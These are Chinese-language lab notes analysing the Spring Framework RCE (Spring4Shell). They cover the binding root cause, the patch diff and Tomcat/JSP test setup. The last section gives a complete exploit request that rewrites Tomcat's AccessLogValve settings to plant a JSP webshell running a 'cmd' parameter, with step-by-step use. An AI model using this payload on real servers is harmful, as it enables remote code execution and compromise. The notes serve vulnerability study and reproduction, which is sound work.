# 漏洞情报

* [Spring RCE 0day高危漏洞预警 - 云+社区 - 腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1967775)

# 分析

* 依据漏洞情报中披露的信息来看，一种缓解措施利用了WebDataBinder来禁止一些特定的属性，可以猜测漏洞产生于参数解析及绑定。下面是缓解措施中两个注解的解释

  ```java
  @InitBinder用于在@Controller中标注于方法上，表示为当前控制器注册一个属性编辑器，所谓的属性编辑器可以理解就是帮助我们完成参数绑定
  手册说明：@InitBinder methods can register controller-specific java.beans.PropertyEditor or Spring Converter and Formatter components. In addition, you can use the MVC config to register Converter and
  Formatter types in a globally shared FormattingConversionServic
  
  @InitBinder方法只对当前Controller生效，要想全局生效，可以使用@ControllerAdvice
  手册说明：@ExceptionHandler, @InitBinder, and @ModelAttribute methods apply only to the @Controller class, or class hierarchy, in which they are declared. If, instead, they are declared in an @ControllerAdvice or
  @RestControllerAdvice class, then they apply to any controller. 
  
  总结就是处理controller中方法参数的解析及绑定，快速理解可以参考https://blog.csdn.net/zero__007/article/details/80466392
  
  ```

* 参考2010年的一个类似原理漏洞[SpringMVC框架任意代码执行漏洞(CVE-2010-1622)分析 - Ruilin (rui0.cn)](http://rui0.cn/archives/1158)

  * 结论1：利用JDK的内省可以依据方法名获取属性（即使不存在真实的属性），反过来也一样，可以依据属性名尝试拼接get/set方法处理属性
  * 结论2：通常而言，内省时属性没有setter就无法修改，但是Array/List/Map多元素对象在只有getter方法没有setter方法时也可以对其中的元素进行修改，从而达到变量覆盖的效果（比如使用Array.set(...)而不是直接的setter）

  > 上述结论时之前漏洞的相关原理，此次漏洞原理类似，但利用的Gadget是Tomcat中的代码片段
  >
  > 话说spring这个洞，实际上就是用户可以控制getter/setter将解析的参数写入对象属性，如果属性不存在就忽略。obj.getXxx够造成obj.getClassLoader就可以访问敏感对象，接下来就是利用这个敏感对象发挥想象力做事情，也就是从getClassLoader对象开始，能不能找到一个特殊的gadget，这个gadget用户可以通过get/setter控制其参数，然后造成任意写的？这个gadget存在，一个可行的gadget是tomcat的日志相关对象，就是poc中pipeline的一个AccessLogValve，这个默认都启用，通过set一系列参数，让日志的名称，后缀，内容，位置都被改变。比如写成一个jsp，并且jsp可以被执行的话，那么就造成了rce。需要注意这个洞，必须利用module.getClassLoader才能绕过spring的验证，而module只有jdk9开始才有，利用环境必须大于jdk9。
  >
  > CachedIntrospectionResults.java 是绕过的关键，调试过程省略
  >
  > 漏洞修补前：
  >
  > ```java
  > if (Class.class == beanClass &&
  >       ("classLoader".equals(pd.getName()) ||  "protectionDomain".equals(pd.getName()))) {
  >    // Ignore Class.getClassLoader() and getProtectionDomain() methods - nobody needs to bind to those
  >    continue;//continue意味着绕过，所以Class.getClassLoader不行，module.getClassLoader可以
  > }
  > ```
  >
  > 漏洞修补后：
  >
  > ```java
  > if (Class.class == beanClass && (!"name".equals(pd.getName()) && !pd.getName().endsWith("Name"))) {
  >    // Only allow all name variants of Class properties
  >    continue;//continue意味着绕过，目前直接class.getModule就断了，class.getClassLoader也断了
  > }
  > ```

# 环境搭建

> 这里是另一份笔记的摘录，略有零散

## SpringBoot-Web部署到外置Tomcat

* Spring Initializr 以war形式创建项目，而不是jar，可直接达到目的(注意需要是可利用版本)

* 部署（注意外置Tomcat版本和内置的版本需要一致，否则版本不一致时Tomcat中的类可能发生变化，从而引发一些类相关的问题）

  * 直接在IDEA中集成外置Tomcat

    * 直接在启动Configure中添加Tomcat Local

      * 如果是第一次的话，应该是需要配置Application server为下载的Tomcat，主要设置Tomcat HOME，Tomcat base directory应该是自动生成

    * 通过IDEA的Fix直接添加Artifact（IDEA中Artifact的概念来自于Maven中的artifactId）

      * 生成后在Deployment标签页可以设置Application context，这里的数据设定应用访问前缀，也就是访问指定的spring mvc 目标地址前，必须加上这个访问前缀
      * 最后形成的结果，属于单Tomcat多实例应用模式

    * 乱码问题

      * Console是乱码，可以在IDEA的bin目录中设置idea64.exe.vmoptions

        * 加上

          ```properties
          -Dfile.encoding=UTF-8
          -Dconsole.encoding=UTF-8
          ```

      * 设置完上面的参数后，启动项目或者新建项目以后可以进行以下检查（上面设置不一定能保证下面是正确的，所以可以适当检查一下，将未设置的手动改一下；idea64.exe.vmoptions中的设置还有一个好处，就是在衍生的Catalina Log/Localhost Log Console中文会显示正常，否则也有可能乱码 ）

        * Settings->Editor->Genral->Console->Default Encoding是否为UTF-8（Console设置）
        * Settings->Editor->FileEncoding中已全部是UTF-8，且勾选上Transparent native-to-ascii conversion（项目编码设置）

      * Tomcat默认是UTF-8，所以上述设置才是有效的

    * 多版本Springboot切换问题

      * 通过Maven切换Springboot版本时，需要将之前编译生成的文件夹删除，之后再重新生成启动运行，否则启动会报错

  * 打包成war后，再手动部署到外置Tomcat

    * 放到Tomcat的webapps目录下（可以先清空之前的内容）
    * 启动starup.bat，tomcat会自动部署war包
    * 这种方式不常用，不做深入展开了，一般采用IDEA集成外置Tomcat方式，也方便源码调试

* 外置部署Tomcat的理由（类加器不一致）

  * 打包war后外置部署或者IDEA集成外置部署Tomcat后相关类加载器为org.apache.catalina.loader.ParallelWebappClassLoader（属于Tomcat,通过它可以访问Tomcat的Gadget（一系列get/set访问））
  * 打包jar前在IDEA项目中按Springboot启动方式直接运行的类加载器为jdk.internal.loader.ClassLoaders$AppClassLoader，在一些复现环境中这个类加载器是无法被利用的（因为它不能访问Tomcat中的Gadget，和Tomcat没有关系）
  * 打包jar后（内置Tomcat）独立运行时的相关类加载器为org.springframework.boot.loader.LaunchedURLClassLoader（父类是URLClassLoader，和Tomcat也没有关系，有限访问，基本也无法利用）
    * 用户可以手动运行java -jar 命令，但是不方便调试，更好的方式是下面一种
    * 在IDEA中，新建一个Run Configure，配置一个Jar Application形式的启动，这种方式能达到手动运行命令的效果，最主要的是可以进行代码调试

* Springboot集成JSP

  ```xml
  springboot web starter
  使用内置Tomcat时，默认情况下是无法使用jsp的，即使内部将jsp拼接成了/WEB-INF/jsp/webinf.jsp进行搜索，但也是利用的ResourceHttpRequestHandler，这个Handler会再下面这些类路径中搜索：
  [classpath [META-INF/resources/], classpath [resources/], classpath [static/], classpath [public/], ServletContext [/]]，并且Path with "WEB-INF" or "META-INF会认为是非法路径，直接404，也就无法找到对应的jsp；要是把路径改成非WEB-INF/META-INF形式,那么即使对应的jsp存在，也只会将其作为静态资源返回；要想内置Tomcat使用jsp，必须引入下面的依赖(Tomcat9环境测试；Tomcat10开始要注意javax转变成Jakarta名称空间引起的问题)
  <dependency>
              <groupId>org.apache.tomcat.embed</groupId>
              <artifactId>tomcat-embed-jasper</artifactId>
  </dependency>
  <!--如果使用jstl，必须引入此库-->
  <dependency>
      <groupId>javax.servlet</groupId>
      <artifactId>jstl</artifactId>
  </dependency>
  之后在application.properties中设置
  spring.mvc.view.prefix=/WEB-INF/jsp/
  spring.mvc.view.suffix=.jsp
  上述配置，可将jsp作为view进行渲染返回，使用的是InternalResourceView，InternalResourceViewResolver 
  如果使用外置Tomcat，依赖可以进行如下改动，因为外置Tomcat默认包含jasper，jstl依旧看需要引入；
  <dependency>
              <groupId>org.apache.tomcat.embed</groupId>
              <artifactId>tomcat-embed-jasper</artifactId>
      		<!--主要用于检查编译及语法-->
      		<scope>provided</scope>
  </dependency>
  
  Jsp在打包时，仍然保持jsp文件格式，在第一次访问后，jsp会被编译成具体的类放在Tomcat的work目录中(外置部署)，并且在原始jsp文件修改后，会重新编译到work目录（调试观测是这样），更具体的可以通过config.getServletContext().getAttribute("javax.servlet.context.tempdir").toString()打印出jsp编译后类所在的位置
  
  上面的做法jsp都是经过了spring框架的，要访问jsp必须要满足spring配置的条件。
  但是如果外置Tomcat的web.xml中，除了默认的spring servlet，还增加了扩展名匹配的jsp规则，那么这个扩展名匹配的规则由于比spring servlet的优先级高，会优先处理，相当于只要绕过tomcat即可，而不需要绕过spring;
  
  springboot启动调试可以看到
  0 = {DispatcherServletRegistrationBean@5731} "dispatcherServlet urls=[/]"
  1 = {FilterRegistrationBean@5950} "characterEncodingFilter urls=[/*] order=-2147483648"
  2 = {FilterRegistrationBean@5951} "formContentFilter urls=[/*] order=-9900"
  3 = {FilterRegistrationBean@5952} "requestContextFilter urls=[/*] order=-105"
  urls=[/]拦截所有请求交给dispatcherServlet处理，它也就是所谓的前端控制器
  上面说的扩展名匹配jsp规则默认在springboot中因此是不可行的，springboot默认只有前端控制器处理所有请求，这样的话，如果想增加一个jsp并且访问是不行的，只能基于已有的jsp，将已有jsp进行修改达到目的
  
  
  JSP Limitations
  When running a Spring Boot application that uses an embedded servlet container (and is packaged
  as an executable archive), there are some limitations in the JSP support.
  • With Jetty and Tomcat, it should work if you use war packaging. An executable war will work
  when launched with java -jar, and will also be deployable to any standard container. JSPs are
  not supported when using an executable jar.
  • Undertow does not support JSPs.
  • Creating a custom error.jsp page does not override the default view for error handling. Custom
  error pages should be used instead.
  简单来说就是jsp不能打包成jar运行，只能打包成war，而且打包成war后，可以可以部署外置tomcat运行也可以按java -jar方式运行。java -jar  *.war的形式运行的jsp文件一样会被编译成class存放在硬盘的某个temp文件夹。
  ```

* **web/WEB-INF/** - The special configuration files required for your application, including the web application deployment descriptor (`web.xml`, defined in the [Servlet Specification](https://wiki.apache.org/tomcat/Specifications)), tag library descriptors for custom tag libraries you have created, and other resource files you wish to include within your web application. Even though this directory appears to be a subdirectory of your *document root*, the Servlet Specification **prohibits(禁止)** serving the contents of this directory (or any file it contains) directly to a client request. Therefore, this is a good place to store configuration information that is sensitive (such as database connection usernames and passwords)

  * 正常情况下web文件下的内容都能被客户端直接访问，但是这个文件夹中的内容是不允许客户端直接访问的，但是服务端自身是可以自己访问的；因此也被称为Java Web 应用安全目录，此目录仅在Web应用中存在

* **web/WEB-INF/web.xml** - The *Web Application Deployment Descriptor* for your application. This is an XML file describing the servlets and other components that make up your application, along with any initialization parameters and container-managed security constraints that you want the server to enforce for you.

  * Servlet的url-pattern匹配规则，以下优先级从高到低

    1. 精确路径匹配：完全一致的具体路径

    2. 路径匹配：以**/**字符开头并以**/\***结尾的字符串用于路径匹配；单独的**/\***属于路径匹配特殊的一种

    3. 扩展名匹配：以**\*.**开头的字符串被用于扩展名匹配，如**\*.jsp**

    4. 缺省匹配：以上都找不到servlet，就用默认的servlet，配置为**/**

       ```xml
       servlet容器中的匹配规则既不是简单的通配，也不是正则表达式，而是特定的规则
       Servlet 2.5开始，一个servlet可以使用多个url-pattern规则
       当servlet容器接收到一个url请求后，容器会用url减去当前应用的上下文路径，以剩余的字符串作为servlet映射
       url-pattern映射匹配过程是有优先顺序的
       当有一个servlet匹配成功以后，就不会去理会剩下的servlet
       
       路径匹配/*和缺省匹配/区别：根本区别就是优先级区别，进而产生了不同的影响
       首先看Tomcat默认在conf/web.xml中配置的servlet
       <!-- ================ Built In Servlet Mappings ========================= -->
       <servlet>
           <servlet-name>default</servlet-name>
           <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
           <init-param>
               <param-name>debug</param-name>
               <param-value>0</param-value>
           </init-param>
           <init-param>
               <param-name>listings</param-name>
               <param-value>false</param-value>
           </init-param>
           <load-on-startup>1</load-on-startup>
       </servlet>
       <servlet>
               <servlet-name>jsp</servlet-name>
               <servlet-class>org.apache.jasper.servlet.JspServlet</servlet-class>
               <init-param>
                   <param-name>fork</param-name>
                   <param-value>false</param-value>
               </init-param>
               <init-param>
                   <param-name>xpoweredBy</param-name>
                   <param-value>false</param-value>
               </init-param>
               <load-on-startup>3</load-on-startup>
       </servlet>
       <!-- The mapping for the default servlet -->
       <servlet-mapping>
           <servlet-name>default</servlet-name>
           <url-pattern>/</url-pattern>
       </servlet-mapping>
       <!-- The mappings for the JSP servlet -->
       <servlet-mapping>
           <servlet-name>jsp</servlet-name>
           <url-pattern>*.jsp</url-pattern>
           <url-pattern>*.jspx</url-pattern>
       </servlet-mapping>
       可以看到默认是支持jsp文件的，jsp优先级高于default，静态资源都会走默认的default servlet
       springmvc中拦截静态资源问题
       <servlet-mapping>
           <servlet-name>springmvc</servlet-name>
           <url-pattern>/</url-pattern>
       </servlet-mapping>
       可以看到会拦截所有请求都走springmvc，包括静态资源，此时静态资源会失败，RequestMapping请求正常；有两种解决方法，一种是增加扩展名高优先级匹配来访问，但是很不方便也不推荐；第二种方式是增加<mvc:default-servlet-handler/>，这样会注册一个DefaultServletHttpRequestHandler，这样之后，静态资源就能正常访问，但是引入了新的问题无法处理@RequestMapping注解请求（因为增加处理bean的时候减少了一开始默认的处理bean），需要增加<mvc:annotation-driven/>，其会注册RequestMappingHandlerAdapter（还有很多别的bean，可以简单理解功能增强，包括了RequestMapping访问）。这样静态资源，动态资源都能处理。但一般都使用springboot，无需太关注。
       annotation-driven的补充理解：https://www.zhihu.com/question/362051844
       ```

# Tomcat Gadget

## AccessLogValve

* org.apache.catalina.loader.ParallelWebappClassLoader.resources.context.parent.pipeline.first是AccessLogValve日志对象

* AccessLogValve中修改其中的如下几个重要属性进行利用

  * ```
    //生成的文件名称前缀
    ParallelWebappClassLoader.resources.context.parent.pipeline.first.prefix=shell
    //将文件日期格式设置为空，那么最后生成的文件再prefix和suffix之间就不存在日期串，相当于prefix就为文件名;目前测试来看这个参数必须得有变动，最后才能生成新文件；这个变动可以是空，也可以是.yyyy-MM这种格式，但必须区别于原始的格式；空时一个比较好的选择
    ParallelWebappClassLoader.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
    //生成的文件后缀
    ParallelWebappClassLoader.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
    //生成文件的目录
    ParallelWebappClassLoader.classLoader.resources.context.parent.pipeline.first.directory=C:\Opt\Tomcat\apache-tomcat-9.0.60\webapps\webenv17_4war\WEB-INF\jsp\
    //文件中写入的格式话内容；最后这个文件中一部分是日志数据（对于Jsp无影响），一部分是注入的代码数据
    //AbstractAccessLogValve.java中注释：%{xxx}i for incoming headers
    //原始代码<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
    //转换后%{prefix}i.getRuntime().exec(request.getParameter("cmd"));%{suffix}i
    //转码后%25{prefix}i.getRuntime().exec(request.getParameter("cmd"))%3b%25{suffix}i
    //利用时在header中加入prefix:<%Runtime   suffix:%>,在请求参数中加入cmd=calc
    //在没有prefix suffix时，就是一段文本写入jsp
    class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25{prefix}i.getRuntime().exec(request.getParameter("cmd"))%3b%25{suffix}i
    
    上述既可以生成一个单独的文件，也可以考虑写入已有的jsp文件
    
    目前最新的Tomcat 9.0.62已经将Resouces进行了处理：
    Unused. Always returns null.
    Deprecated This will be removed in Tomcat 10.1.x onwards
    因此调用链将被断掉了
    
    一个测试组合结果（发送POST请求时需要在header处加入Content-Type: application/x-www-form-urlencoded）
    第一次访问进行请求修改“log”位置
    class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25{prefix}i.getRuntime().exec(request.getParameter("cmd"))%3b%25{suffix}i&class.module.classLoader.resources.context.parent.pipeline.first.prefix=webinf&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=C:\Opt\Tomcat\apache-tomcat-9.0.60\webapps\webenv17_4war\WEB-INF\jsp
    第二次访问，在header中加入prefix:<%Runtime   suffix:%>，构建jsp片段
    第三次访问目标jsp，传递cmd=calc参数，执行验证
    
    
    ```

* 原理是通过修改控制日志对象的一些参数，将日志内容写入到一个文件比如jsp，如果服务器能运行jsp，那么就能造成rce

  

